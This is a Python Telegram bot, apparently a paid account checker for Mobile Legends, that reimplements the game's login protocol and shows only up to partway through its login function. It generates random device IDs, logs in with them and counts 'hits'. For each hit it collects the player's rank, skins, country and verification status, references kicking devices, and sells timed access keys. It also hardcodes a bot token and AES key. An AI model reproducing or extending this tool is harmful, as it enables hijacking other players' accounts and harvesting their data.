# mlbb_bot.py
from __future__ import annotations
import asyncio
import hashlib
import json
import os
import random
import struct
import sys
import time
import uuid
import zlib
import socket
from enum import Enum
from typing import Any, List, Optional, Tuple
from datetime import datetime, timezone, timedelta
import logging
import string
import re
from concurrent.futures import ThreadPoolExecutor

import zstandard as zstd
from Crypto.Cipher import AES
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.error import BadRequest

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8692114721:AAFWynpnoKIza6ym4lv3EBomf4WJTmXJCpo"
ADMIN_IDS = [8477982865]
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
BANNED_FILE = "banned_accounts.txt"
DEVICE_LIMITS_FILE = "device_limits.json"
DEVICE_HISTORY_FILE = "device_history.json"
LIFETIME_HISTORY_FILE = "lifetime_history.json"

LOGIN_HOST = os.environ.get('MLBB_LOGIN_HOST', 'login.ml.youngjoygame.com')
LOGIN_PORT = int(os.environ.get('MLBB_LOGIN_PORT', 30021))
CLI_VER = os.environ.get('MLBB_CLI_VER', '2.1.95.1205.1')
CHANNEL = os.environ.get('MLBB_CHANNEL', 'and_usa')
LANG = os.environ.get('MLBB_LANG', 'en')
CONN_TO = float(os.environ.get('MLBB_CONN_TO', '3.0'))
READ_TO = float(os.environ.get('MLBB_READ_TO', '3.5'))
_AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
_AES_IV = b'\x00' * 16

TZ_WIB = timezone(timedelta(hours=7))

HERO_ID_MAP = {
    1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal",
    7: "Alucard", 8: "Karina", 9: "Akai", 10: "Franco", 11: "Bane", 12: "Bruno",
    13: "Clint", 14: "Rafaela", 15: "Eudora", 16: "Zilong", 17: "Fanny", 18: "Layla",
    19: "Minotaur", 20: "Lolita", 21: "Hayabusa", 22: "Freya", 23: "Gord", 24: "Natalia",
    25: "Kagura", 26: "Chou", 27: "Sun", 28: "Alpha", 29: "Ruby", 30: "Yi Sun-shin",
    31: "Moskov", 32: "Johnson", 33: "Cyclops", 34: "Estes", 35: "Hilda", 36: "Aurora",
    37: "Lapu-Lapu", 38: "Vexana", 39: "Roger", 40: "Karrie", 41: "Gatotkaca", 42: "Harley",
    43: "Irithel", 44: "Grock", 45: "Argus", 46: "Odette", 47: "Lancelot", 48: "Diggie",
    49: "Hylos", 50: "Zhask", 51: "Helcurt", 52: "Pharsa", 53: "Lesley", 54: "Jawhead",
    55: "Angela", 56: "Gusion", 57: "Valir", 58: "Martis", 59: "Uranus", 60: "Hanabi",
    61: "Chang'e", 62: "Kaja", 63: "Selena", 64: "Aldous", 65: "Claude", 66: "Vale",
    67: "Leomord", 68: "Lunox", 69: "Hanzo", 70: "Belerick", 71: "Kimmy", 72: "Thamuz",
    73: "Harith", 74: "Minsitthar", 75: "Kadita", 76: "Faramis", 77: "Badang", 78: "Khufra",
    79: "Granger", 80: "Guinevere", 81: "Esmeralda", 82: "Terizla", 83: "X.Borg", 84: "Ling",
    85: "Dyrroth", 86: "Lylia", 87: "Baxia", 88: "Masha", 89: "Wanwan", 90: "Silvanna",
    91: "Cecilion", 92: "Carmilla", 93: "Atlas", 94: "Popol and Kupa", 95: "Yu Zhong",
    96: "Luo Yi", 97: "Benedetta", 98: "Khaleed", 99: "Barats", 100: "Brody", 101: "Yve",
    102: "Mathilda", 103: "Paquito", 104: "Gloo", 105: "Beatrix", 106: "Phoveus",
    107: "Natan", 108: "Aulus", 109: "Aamon", 110: "Valentina", 111: "Edith", 112: "Floryn",
    113: "Yin", 114: "Melissa", 115: "Xavier", 116: "Julian", 117: "Fredrinn", 118: "Joy",
    119: "Novaria", 120: "Arlott", 121: "Ixia", 122: "Nolan", 123: "Cici", 124: "Chip",
    125: "Zhuxin", 126: "Suyou", 127: "Lukas", 128: "Kalea", 129: "Zetian", 130: "Obsidia"
}

RANK_DEFS = [
    (0, 3, "Warrior III"), (4, 7, "Warrior II"), (8, 11, "Warrior I"),
    (12, 16, "Elite III"), (17, 21, "Elite II"), (22, 26, "Elite I"),
    (27, 31, "Master IV"), (32, 36, "Master III"), (37, 41, "Master II"), (42, 46, "Master I"),
    (47, 52, "Grandmaster V"), (53, 58, "Grandmaster IV"), (59, 64, "Grandmaster III"),
    (65, 70, "Grandmaster II"), (71, 76, "Grandmaster I"),
    (77, 82, "Epic V"), (83, 88, "Epic IV"), (89, 94, "Epic III"),
    (95, 100, "Epic II"), (101, 106, "Epic I"),
    (107, 112, "Legend V"), (113, 118, "Legend IV"), (119, 124, "Legend III"),
    (125, 130, "Legend II"), (131, 136, "Legend I"),
    (137, 161, lambda p: f"Mythic {p - 136}"),
    (162, 186, lambda p: f"Mythical Honor {p - 136}"),
    (187, 236, lambda p: f"Mythical Glory {p - 136}"),
    (237, 9999, lambda p: f"Mythical Immortal {p - 136}"),
]

COLLECTOR_TIERS = [
    (1000, 4000, "Amateur Collector"), (4000, 10000, "Junior Collector"),
    (10000, 22000, "Seasoned Collector"), (22000, 44000, "Expert Collector"),
    (44000, 84000, "Renowned Collector"), (84000, 160000, "Exalted Collector"),
    (160000, 280000, "Mega Collector"), (280000, float("inf"), "World Collector"),
]

AFFINITY_MAP = {0: "None", 1: "Bronze", 2: "Silver", 3: "Gold", 4: "Platinum", 5: "Diamond"}
ROMAN = ["V", "IV", "III", "II", "I"]


def hero_name(hid):
    return HERO_ID_MAP.get(hid, f"Hero({hid})")


def map_rank(points):
    if points is None:
        return "Unknown"
    try:
        points = int(points)
    except Exception:
        return "Unknown"
    for mn, mx, label in RANK_DEFS:
        if mn <= points <= mx:
            return label(points) if callable(label) else label
    return "Unknown"


def collector_tier_str(pts):
    try:
        pts = int(pts)
    except Exception:
        return "No Tier"
    if pts < 1000:
        return "No Tier"
    for lo, hi, name in COLLECTOR_TIERS:
        if lo <= pts < hi:
            if hi == float("inf"):
                return name
            idx = min(4, int((pts - lo) // ((hi - lo) / 5)))
            return f"{name} {ROMAN[idx]}"
    return "Unknown"


def fmt_last_login(ts_val):
    if not ts_val:
        return "Never"
    try:
        t = int(ts_val)
        if t <= 0:
            return "Never"
        diff = max(0, int(time.time()) - t)
        d = diff // 86400
        h = (diff % 86400) // 3600
        m = (diff % 3600) // 60
        if d > 0:
            return f"{d}d {h}h ago"
        if h > 0:
            return f"{h}h {m}m ago"
        return f"{m}m ago"
    except Exception:
        return str(ts_val)


def fmt_created_at(ts_val):
    if not ts_val:
        return "N/A"
    try:
        t = int(ts_val)
        if t <= 0:
            return "N/A"
        dt = datetime.fromtimestamp(t, tz=timezone.utc).astimezone(TZ_WIB)
        return dt.strftime("%Y-%m-%d %H:%M:%S WIB")
    except Exception:
        return "N/A"


def is_banned_status(ban_status) -> bool:
    if not ban_status:
        return False
    return 'ban' in str(ban_status).lower()


def fmt_duration(seconds: float) -> str:
    seconds = int(seconds)
    if seconds < 60:
        return f"{seconds}s"
    if seconds < 3600:
        return f"{seconds // 60}m {seconds % 60}s"
    if seconds < 86400:
        return f"{seconds // 3600}h {(seconds % 3600) // 60}m"
    return f"{seconds // 86400}d {(seconds % 86400) // 3600}h"


# ────────────────────────────────────────────────────────────────
# V2L DETECTION
# ────────────────────────────────────────────────────────────────

async def _get_v2l_status(reader, writer, acc, zone) -> str:
    try:
        writer.write(_frame(10208, 4, SDP({0: int(acc), 1: int(zone)}).data))
        await asyncio.wait_for(writer.drain(), timeout=1.0)
        for _ in range(3):
            try:
                hdr = await asyncio.wait_for(_read_n(reader, 4), timeout=READ_TO)
                flags = int.from_bytes(hdr, 'big')
                size = flags & 16777215
                ct = flags >> 24
                body = await asyncio.wait_for(_read_n(reader, size - 4), timeout=READ_TO)
                body = _decode(ct, body)
                outer = SDP(body)
                pid = outer.get(0)
                raw = outer.get(6) or outer.get(5)
                if pid == 10208 and raw:
                    inner = SDP(raw)
                    for tag in (10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21):
                        val = inner.get(tag)
                        if val is None:
                            continue
                        if isinstance(val, (int, float)):
                            return "Enabled" if int(val) > 0 else "Disabled"
                        if isinstance(val, str):
                            if val.lower() in ("1", "true", "enabled", "yes"):
                                return "Enabled"
                            if val.lower() in ("0", "false", "disabled", "no"):
                                return "Disabled"
                elif pid is None:
                    break
            except Exception:
                break
    except Exception:
        pass

    try:
        writer.write(_frame(10145, 5, SDP({0: int(acc), 1: int(zone)}).data))
        await asyncio.wait_for(writer.drain(), timeout=1.0)
        for _ in range(3):
            try:
                hdr = await asyncio.wait_for(_read_n(reader, 4), timeout=READ_TO)
                flags = int.from_bytes(hdr, 'big')
                size = flags & 16777215
                ct = flags >> 24
                body = await asyncio.wait_for(_read_n(reader, size - 4), timeout=READ_TO)
                body = _decode(ct, body)
                outer = SDP(body)
                pid = outer.get(0)
                raw = outer.get(6) or outer.get(5)
                if pid in (10146, 10160) and raw:
                    inner = SDP(raw)
                    for tag in (10, 11, 13, 14, 15, 0, 2, 3, 5):
                        val = inner.get(tag)
                        if val is None:
                            continue
                        if isinstance(val, (int, float)):
                            return "Enabled" if int(val) > 0 else "Disabled"
                        if isinstance(val, str):
                            if val.lower() in ("1", "true", "enabled", "yes"):
                                return "Enabled"
                            if val.lower() in ("0", "false", "disabled", "no"):
                                return "Disabled"
                elif pid is None:
                    break
            except Exception:
                break
    except Exception:
        pass

    try:
        writer.write(_frame(10143, 6, SDP({0: int(acc), 1: int(zone)}).data))
        await asyncio.wait_for(writer.drain(), timeout=1.0)
        for _ in range(3):
            try:
                hdr = await asyncio.wait_for(_read_n(reader, 4), timeout=READ_TO)
                flags = int.from_bytes(hdr, 'big')
                size = flags & 16777215
                ct = flags >> 24
                body = await asyncio.wait_for(_read_n(reader, size - 4), timeout=READ_TO)
                body = _decode(ct, body)
                outer = SDP(body)
                pid = outer.get(0)
                raw = outer.get(6) or outer.get(5)
                if pid == 10144 and raw:
                    inner = SDP(raw)
                    for tag in (118, 5, 2, 3):
                        nested = inner.get(tag)
                        if isinstance(nested, (dict, SDP)):
                            for subtag in (10, 11, 13, 14, 15, 0, 2, 3, 5):
                                val = nested.get(subtag)
                                if val is None:
                                    continue
                                if isinstance(val, (int, float)):
                                    return "Enabled" if int(val) > 0 else "Disabled"
                                if isinstance(val, str):
                                    if val.lower() in ("1", "true", "enabled", "yes"):
                                        return "Enabled"
                                    if val.lower() in ("0", "false", "disabled", "no"):
                                        return "Disabled"
                elif pid is None:
                    break
            except Exception:
                break
    except Exception:
        pass

    return "N/A"


def extract_player_data(result, created_ts=None, v2l_status="N/A") -> Optional[dict]:
    if not result:
        return None
    try:
        player_list = result.get(0)
        if not player_list:
            return None
        if isinstance(player_list, (dict, SDP)):
            pd = player_list
        elif isinstance(player_list, list):
            if len(player_list) == 0:
                return None
            pd = player_list[0]
        else:
            return None
        if not isinstance(pd, (dict, SDP)):
            return None
        skin = 0
        try:
            skin = int(pd.get(83, 0) or 0)
        except Exception:
            pass
        collector_pts = 0
        t136 = pd.get(136)
        if isinstance(t136, (dict, SDP)):
            try:
                collector_pts = int(t136.get(9, 0) or 0)
            except Exception:
                pass
        aff_lv = 0
        t135 = pd.get(135)
        if isinstance(t135, (dict, SDP)):
            try:
                aff_lv = int(t135.get(1, 0) or 0)
            except Exception:
                pass
        squad_name = str(pd.get(30, "") or "").replace("`", "").strip()
        squad_icon = str(pd.get(31, "") or "")
        squad = f"{squad_icon} {squad_name}".strip() if squad_name else "—"
        t91 = pd.get(91, [])
        last_hero = "N/A"
        prev_heroes = []
        if isinstance(t91, list) and t91:
            try:
                last_hero = hero_name(int(t91[0]))
            except Exception:
                pass
            if len(t91) > 1:
                seen = set()
                for hid in t91[1:]:
                    try:
                        hid = int(hid)
                        if hid not in seen:
                            seen.add(hid)
                            prev_heroes.append(hero_name(hid))
                    except Exception:
                        pass
                    if len(prev_heroes) >= 5:
                        break
        wins = 0
        losses = 0
        try:
            wins = int(pd.get(18, 0) or 0)
        except Exception:
            pass
        try:
            losses = int(pd.get(155, 0) or 0)
        except Exception:
            pass
        total_battles = wins + losses
        win_rate = f"{wins / total_battles * 100:.1f}%" if total_battles > 0 else "N/A"
        nickname = str(pd.get(2, "") or "").strip() or "Unknown"
        level = 0
        try:
            level = int(pd.get(3, 0) or 0)
        except Exception:
            pass
        hero_count = 0
        try:
            hero_count = int(pd.get(4, 0) or 0)
        except Exception:
            pass

        created_raw = pd.get(42) or created_ts
        created_at_str = fmt_created_at(created_raw)

        return {
            "nickname": nickname,
            "player_id": pd.get(0, "Unknown"),
            "server_id": pd.get(1, "Unknown"),
            "level": level,
            "skin_count": skin,
            "hero_count": hero_count,
            "last_login": fmt_last_login(pd.get(5, 0)),
            "last_login_country": pd.get(87, "Unknown") or "Unknown",
            "create_country": pd.get(97, "Unknown") or "Unknown",
            "current_rank": map_rank(pd.get(8)),
            "high_rank": map_rank(pd.get(95)),
            "collector_tier": collector_tier_str(collector_pts),
            "squad": squad,
            "affinity": AFFINITY_MAP.get(aff_lv, f"Lv{aff_lv}") if aff_lv else "None",
            "total_battles": total_battles,
            "wins": wins,
            "win_rate": win_rate,
            "last_hero": last_hero,
            "prev_heroes": prev_heroes,
            "v2l_status": v2l_status,
            "created_at": created_at_str,
        }
    except Exception as e:
        logger.error(f"extract_player_data error: {e}")
        return None


def format_result_line(res: dict) -> str:
    acc = res['acc']
    zone = res['zone']
    did = res['did']
    ban = res.get('ban_status', 'NORMAL')
    player = res.get('player')
    if player:
        prev = ", ".join(player["prev_heroes"]) if player["prev_heroes"] else "N/A"
        line = (
            f"Account: {acc} | Zone: {zone} | "
            f"Name: {player['nickname']} | "
            f"Level: {player['level']} | "
            f"Rank: {player['current_rank']} | "
            f"Highest Rank: {player['high_rank']} | "
            f"Skins: {player['skin_count']} | "
            f"Heroes: {player['hero_count']} | "
            f"Battles: {player['total_battles']} | "
            f"WR: {player['win_rate']} | "
            f"Last Hero: {player['last_hero']} | "
            f"Prev: {prev} | "
            f"Squad: {player['squad']} | "
            f"Collector: {player['collector_tier']} | "
            f"Affinity: {player['affinity']} | "
            f"V2L Status: {player.get('v2l_status', 'N/A')} | "
            f"Created: {player.get('created_at', 'N/A')} | "
            f"Last Login: {player['last_login']} | "
            f"Country: {player['last_login_country']} | "
            f"Reg: {player['create_country']} | "
            f"Ban: {ban} | "
            f"DevID: {did}"
        )
    else:
        line = f"Account: {acc} | Zone: {zone} | Ban: {ban} | DevID: {did}"
    return line


def format_banned_line(res: dict) -> str:
    acc = res['acc']
    zone = res['zone']
    did = res['did']
    ban = res.get('ban_status', 'Unknown')
    player = res.get('player') or {}
    return (
        f"Account: {acc} | Zone: {zone} | "
        f"Name: {player.get('nickname', 'N/A')} | "
        f"Level: {player.get('level', 0)} | "
        f"Rank: {player.get('current_rank', 'Unknown')} | "
        f"V2L: {player.get('v2l_status', 'N/A')} | "
        f"Created: {player.get('created_at', 'N/A')} | "
        f"Ban: {ban} | "
        f"DevID: {did}"
    )


class LiveStats:
    def __init__(self):
        self.lvl_1_30 = 0
        self.lvl_31_50 = 0
        self.lvl_51_99 = 0
        self.lvl_100p = 0
        self.skin_1_50 = 0
        self.skin_51_99 = 0
        self.skin_100_250 = 0
        self.skin_251_300 = 0
        self.skin_301_400 = 0
        self.skin_400p = 0
        self.rank_warrior = 0
        self.rank_elite = 0
        self.rank_master = 0
        self.rank_gm = 0
        self.rank_epic = 0
        self.rank_legend = 0
        self.rank_mythic = 0
        self.total_hits = 0
        self.unreg = 0
        self.with_info = 0
        self.no_info = 0
        self.banned = 0
        self.v2l_active = 0
        self.v2l_inactive = 0

    def add_hit(self, res: dict):
        self.total_hits += 1
        player = res.get('player')
        if not player:
            self.no_info += 1
            return
        self.with_info += 1
        level = player.get('level', 0) or 0
        skin = player.get('skin_count', 0) or 0
        rank = player.get('current_rank', '') or ''
        v2l = str(player.get('v2l_status', '')).lower()
        if v2l == 'enabled':
            self.v2l_active += 1
        elif v2l == 'disabled':
            self.v2l_inactive += 1
        if level <= 30:
            self.lvl_1_30 += 1
        elif level <= 50:
            self.lvl_31_50 += 1
        elif level <= 99:
            self.lvl_51_99 += 1
        else:
            self.lvl_100p += 1
        if skin <= 50:
            self.skin_1_50 += 1
        elif skin <= 99:
            self.skin_51_99 += 1
        elif skin <= 250:
            self.skin_100_250 += 1
        elif skin <= 300:
            self.skin_251_300 += 1
        elif skin <= 400:
            self.skin_301_400 += 1
        else:
            self.skin_400p += 1
        rank_lower = rank.lower()
        if 'warrior' in rank_lower:
            self.rank_warrior += 1
        elif 'elite' in rank_lower:
            self.rank_elite += 1
        elif 'master' in rank_lower:
            self.rank_master += 1
        elif 'grandmaster' in rank_lower:
            self.rank_gm += 1
        elif 'epic' in rank_lower:
            self.rank_epic += 1
        elif 'legend' in rank_lower:
            self.rank_legend += 1
        elif 'mythic' in rank_lower or 'mythical' in rank_lower:
            self.rank_mythic += 1

    def add_banned(self, res: dict):
        self.total_hits += 1
        self.banned += 1
        if res.get('player'):
            self.with_info += 1
        else:
            self.no_info += 1

    def add_unreg(self):
        self.unreg += 1

    def format(self) -> str:
        return (
            f"📊 Live Stats\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📈 Level\n"
            f"  1-30: {self.lvl_1_30:,} | 31-50: {self.lvl_31_50:,}\n"
            f"  51-99: {self.lvl_51_99:,} | 100+: {self.lvl_100p:,}\n\n"
            f"🎨 Skin\n"
            f"  1-50: {self.skin_1_50:,} | 51-99: {self.skin_51_99:,}\n"
            f"  100-250: {self.skin_100_250:,} | 251-300: {self.skin_251_300:,}\n"
            f"  301-400: {self.skin_301_400:,} | 400+: {self.skin_400p:,}\n\n"
            f"🏆 Rank\n"
            f"  Warrior: {self.rank_warrior:,} | Elite: {self.rank_elite:,}\n"
            f"  Master: {self.rank_master:,} | GM: {self.rank_gm:,}\n"
            f"  Epic: {self.rank_epic:,} | Legend: {self.rank_legend:,}\n"
            f"  Mythic+: {self.rank_mythic:,}\n\n"
            f"🔐 V2L\n"
            f"  Enabled: {self.v2l_active:,} | Disabled: {self.v2l_inactive:,}\n\n"
            f"🚫 Banned: {self.banned:,}\n"
            f"📦 Hits: {self.total_hits:,} | Info: {self.with_info:,}\n"
            f"🚫 No Info: {self.no_info:,} | Unreg: {self.unreg:,}"
        )


class KeyManager:
    def __init__(self):
        self.keys = self._load(KEYS_FILE)
        self.users = self._load(USERS_FILE)
        self.device_limits = self._load(DEVICE_LIMITS_FILE)
        self.device_history = self._load(DEVICE_HISTORY_FILE)
        self.lifetime_history = self._load(LIFETIME_HISTORY_FILE)

    def _load(self, path: str) -> dict:
        try:
            if os.path.exists(path):
                with open(path, 'r') as f:
                    return json.load(f)
        except Exception:
            pass
        return {}

    def _save_keys(self):
        try:
            with open(KEYS_FILE, 'w') as f:
                json.dump(self.keys, f, indent=2)
        except Exception as e:
            logger.error(f"Save keys error: {e}")

    def _save_users(self):
        try:
            with open(USERS_FILE, 'w') as f:
                json.dump(self.users, f, indent=2)
        except Exception as e:
            logger.error(f"Save users error: {e}")

    def _save_device_limits(self):
        try:
            with open(DEVICE_LIMITS_FILE, 'w') as f:
                json.dump(self.device_limits, f, indent=2)
        except Exception as e:
            logger.error(f"Save device limits error: {e}")

    def _save_device_history(self):
        try:
            with open(DEVICE_HISTORY_FILE, 'w') as f:
                json.dump(self.device_history, f, indent=2)
        except Exception as e:
            logger.error(f"Save device history error: {e}")

    def _save_lifetime_history(self):
        try:
            with open(LIFETIME_HISTORY_FILE, 'w') as f:
                json.dump(self.lifetime_history, f, indent=2)
        except Exception as e:
            logger.error(f"Save lifetime history error: {e}")

    def generate_key(self, duration_seconds: int, label: str, created_by: int) -> str:
        key = "MLBB-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
        self.keys[key] = {
            "duration": duration_seconds,
            "label": label,
            "created_by": created_by,
            "created_at": time.time(),
            "used_by": None,
            "used_at": None
        }
        self._save_keys()
        return key

    def redeem_key(self, key: str, user_id: int) -> Tuple[bool, str]:
        key = key.strip().upper()
        if key not in self.keys:
            return False, "Invalid key."
        kdata = self.keys[key]
        if kdata["used_by"] is not None:
            return False, "Key already used."
        uid = str(user_id)
        now = time.time()
        kdata["used_by"] = user_id
        kdata["used_at"] = now
        self._save_keys()
        current_expiry = self.users.get(uid, {}).get("expires", 0)
        new_expiry = max(current_expiry, now) + kdata["duration"]
        if uid not in self.users:
            self.users[uid] = {}
        self.users[uid]["expires"] = new_expiry
        self.users[uid]["last_key"] = key
        self._save_users()
        label = kdata["label"]
        expires_dt = datetime.fromtimestamp(new_expiry).strftime("%Y-%m-%d %H:%M:%S")
        return True, f"Access granted!\nPlan: {label}\nExpires: {expires_dt}"

    def has_access(self, user_id: int) -> bool:
        if user_id in ADMIN_IDS:
            return True
        uid = str(user_id)
        if uid not in self.users:
            return False
        return self.users[uid].get("expires", 0) > time.time()

    def get_expiry(self, user_id: int) -> Optional[str]:
        uid = str(user_id)
        if uid not in self.users:
            return None
        exp = self.users[uid].get("expires", 0)
        if exp <= time.time():
            return None
        return datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S")

    def list_keys(self, show_used: bool = False) -> List[dict]:
        result = []
        for k, v in self.keys.items():
            if not show_used and v["used_by"] is not None:
                continue
            result.append({"key": k, **v})
        return result

    def list_users(self) -> List[dict]:
        result = []
        now = time.time()
        for uid, data in self.users.items():
            exp = data.get("expires", 0)
            result.append({
                "uid": uid,
                "expires": datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S") if exp > 0 else "Expired",
                "active": exp > now
            })
        return result

    def revoke_user(self, user_id: int) -> bool:
        uid = str(user_id)
        if uid in self.users:
            self.users[uid]["expires"] = 0
            self._save_users()
            return True
        return False

    def delete_key(self, key: str) -> bool:
        key = key.strip().upper()
        if key in self.keys:
            del self.keys[key]
            self._save_keys()
            return True
        return False

    # ── CONCURRENT DEVICE LIMIT MANAGEMENT ──

    def get_device_limit(self, user_id: int) -> int:
        """Max CONCURRENT devices a user can kick at once."""
        uid = str(user_id)
        try:
            return int(self.device_limits.get(uid, 1))
        except Exception:
            return 1

    def set_device_limit(self, user_id: int, limit: int) -> bool:
        uid = str(user_id)
        self.device_limits[uid] = max(1, int(limit))
        self._save_device_limits()
        return True

    def add_device_limit(self, user_id: int, amount: int) -> int:
        uid = str(user_id)
        current = self.get_device_limit(user_id)
        new_limit = max(1, current + int(amount))
        self.device_limits[uid] = new_limit
        self._save_device_limits()
        return new_limit

    def reset_device_limit(self, user_id: int) -> bool:
        uid = str(user_id)
        self.device_limits[uid] = 1
        self._save_device_limits()
        if uid in self.device_history:
            del self.device_history[uid]
            self._save_device_history()
        return True

    def get_user_devices(self, user_id: int) -> list:
        """Currently ACTIVE devices (running kickers)."""
        uid = str(user_id)
        return self.device_history.get(uid, [])

    def add_user_device(self, user_id: int, device_id: str) -> bool:
        """Mark a device as currently active."""
        uid = str(user_id)
        if uid not in self.device_history:
            self.device_history[uid] = []
        if device_id not in self.device_history[uid]:
            self.device_history[uid].append(device_id)
            self._save_device_history()
        return True

    def remove_user_device(self, user_id: int, device_id: str) -> bool:
        """Remove a device from active list (frees up a slot)."""
        uid = str(user_id)
        if uid in self.device_history and device_id in self.device_history[uid]:
            self.device_history[uid].remove(device_id)
            if not self.device_history[uid]:
                del self.device_history[uid]
            self._save_device_history()
            return True
        return False

    def get_device_count(self, user_id: int) -> int:
        """Number of currently ACTIVE devices."""
        uid = str(user_id)
        return len(self.device_history.get(uid, []))

    def list_device_limits(self) -> List[dict]:
        result = []
        for uid, limit in self.device_limits.items():
            result.append({
                "uid": uid,
                "limit": int(limit),
                "used": self.get_device_count(int(uid)),
            })
        return result

    # ── LIFETIME HISTORY (admin reference only) ──

    def get_lifetime_devices(self, user_id: int) -> list:
        uid = str(user_id)
        return self.lifetime_history.get(uid, [])

    def add_lifetime_device(self, user_id: int, device_id: str):
        uid = str(user_id)
        if uid not in self.lifetime_history:
            self.lifetime_history[uid] = []
        if device_id not in self.lifetime_history[uid]:
            self.lifetime_history[uid].append(device_id)
            self._save_lifetime_history()


def parse_duration(text: str) -> Tuple[Optional[int], Optional[str]]:
    text = text.strip().lower()
    units = {
        'h': 3600, 'hour': 3600, 'hours': 3600,
        'd': 86400, 'day': 86400, 'days': 86400,
        'w': 604800, 'week': 604800, 'weeks': 604800,
        'm': 2592000, 'month': 2592000, 'months': 2592000,
        'y': 31536000, 'year': 31536000, 'years': 31536000
    }
    match = re.fullmatch(r'(\d+)\s*([a-z]+)', text)
    if not match:
        return None, None
    amount = int(match.group(1))
    unit = match.group(2)
    if unit not in units:
        return None, None
    seconds = amount * units[unit]
    label = f"{amount} {unit}"
    return seconds, label


def _aes(d: bytes) -> bytes:
    c = AES.new(_AES_KEY, AES.MODE_CBC, iv=_AES_IV)
    return c.decrypt(d[:-1] if len(d) % 16 else d)


class _T(Enum):
    IP = 0
    IN = 1
    FL = 2
    DB = 3
    ST = 4
    LI = 5
    DI = 6
    SB = 7
    SE = 8


class SDP(dict):
    def __init__(self, src: Any = None):
        super().__init__()
        self._b = b''
        self._o = 0
        if isinstance(src, bytes):
            self._b = src
            self._unpack()
        elif src is not None:
            super().update(src)
            self._pack()

    def _pack(self):
        self._b = bytes([_T.SB.value << 4])
        for t, v in sorted(self.items()):
            self._pk(t, v)
        self._b += bytes([_T.SE.value << 4])

    def _vn(self, v: int) -> bytes:
        r = bytearray()
        while v >= 128:
            r.append(v & 127 | 128)
            v >>= 7
        r.append(v & 127)
        return bytes(r)

    def _hdr(self, t: int, dt: _T):
        self._b += bytes([dt.value << 4 | t]) if t < 15 else bytes([dt.value << 4 | 15]) + self._vn(t)

    def _pk(self, t: int, v: Any):
        if isinstance(v, bool):
            self._hdr(t, _T.IP)
            self._b += self._vn(1 if v else 0)
        elif isinstance(v, int):
            if v < 0:
                self._hdr(t, _T.IN)
                self._b += self._vn(-v)
            else:
                self._hdr(t, _T.IP)
                self._b += self._vn(v)
        elif isinstance(v, float):
            self._hdr(t, _T.DB)
            p = struct.pack('<d', v)
            self._b += self._vn(len(p)) + p
        elif isinstance(v, (str, bytes)):
            self._hdr(t, _T.ST)
            e = v.encode() if isinstance(v, str) else v
            self._b += self._vn(len(e)) + e
        elif isinstance(v, list):
            self._hdr(t, _T.LI)
            self._b += self._vn(len(v))
            for i in v:
                self._pk(0, i)
        elif isinstance(v, dict):
            if isinstance(v, SDP):
                self._hdr(t, _T.SB)
                for k, vv in sorted(v.items()):
                    self._pk(k, vv)
                self._b += bytes([_T.SE.value << 4])
            else:
                self._hdr(t, _T.DI)
                self._b += self._vn(len(v))
                for k, vv in sorted(v.items()):
                    self._pk(0, k)
                    self._pk(0, vv)

    @property
    def data(self) -> bytes:
        return self._b

    def _unpack(self):
        if not self._b:
            return
        if self._b[0] >> 4 == _T.SB.value:
            self._o = 1
        while self._o < len(self._b):
            t, v = self._up()
            if isinstance(v, _T) and v == _T.SE:
                break
            self[t] = v

    def _rn(self) -> int:
        n = 1
        val = self._b[self._o] & 127
        while self._b[self._o + n - 1] >= 128:
            val |= (self._b[self._o + n] & 127) << 7 * n
            n += 1
        self._o += n
        return val

    def _up(self) -> Tuple[int, Any]:
        if self._o >= len(self._b):
            return (0, None)
        h = self._b[self._o]
        t = h & 15
        dt = _T(h >> 4)
        self._o += 1
        if t == 15:
            t = self._rn()
        if dt == _T.IP:
            return (t, self._rn())
        if dt == _T.IN:
            return (t, -self._rn())
        if dt == _T.DB:
            return (t, struct.unpack('<d', self._rn().to_bytes(8, 'little'))[0])
        if dt == _T.ST:
            n = self._rn()
            try:
                vv = self._b[self._o:self._o + n].decode()
            except Exception:
                vv = self._b[self._o:self._o + n]
            self._o += n
            return (t, vv)
        if dt == _T.LI:
            n = self._rn()
            items = []
            for _ in range(n):
                _, i = self._up()
                items.append(i)
            return (t, items)
        if dt == _T.DI:
            n = self._rn()
            d = {}
            for _ in range(n):
                _, k = self._up()
                _, vv = self._up()
                d[k] = vv
            return (t, d)
        if dt == _T.SB:
            sub = {}
            while True:
                st, sv = self._up()
                if isinstance(sv, _T) and sv == _T.SE:
                    break
                sub[st] = sv
            return (t, SDP(sub))
        if dt == _T.SE:
            return (t, _T.SE)
        return (t, None)


def _frame(pid: int, seq: int, payload: bytes) -> bytes:
    pkt = SDP({0: pid, 1: seq, 5: payload}).data
    buf = zstd.compress(pkt)
    return (len(buf) + 4 | 16 << 24).to_bytes(4, 'big') + buf


def _decode(ct: int, d: bytes) -> bytes:
    if ct == 1:
        return zlib.decompress(d)
    if ct == 16:
        return zstd.decompress(d)
    if ct == 2:
        return _aes(d).rstrip(b'\x00')
    if ct == 3:
        return zlib.decompress(_aes(d).rstrip(b'\x00'))
    if ct == 18:
        return zstd.decompress(_aes(d).rstrip(b'\x00'))
    return d


def _gen() -> str:
    imei = ''.join((str(random.randint(0, 9)) for _ in range(15)))
    md5 = hashlib.md5(imei.encode()).hexdigest()
    aid = '%016x' % random.getrandbits(64)
    adv = str(uuid.UUID(int=random.getrandbits(128)))
    return f'and_{md5}{aid}{adv}'


def _login_frame(did: str) -> bytes:
    p = did.split('_')
    info = p[1] if len(p) >= 2 else did
    if len(p) >= 3 and len(info) < 32:
        info += '_' + p[2]
    md5 = info[:32] if len(info) >= 32 else info
    aid = info[32:48] if len(info) >= 48 else ''
    adv = info[48:] if len(info) > 48 else ''
    payload = SDP({0: did, 1: f'gps_adid={adv}&android_id={aid}&device_unique_id={md5}', 2: CLI_VER, 3: CHANNEL, 4: LANG}).data
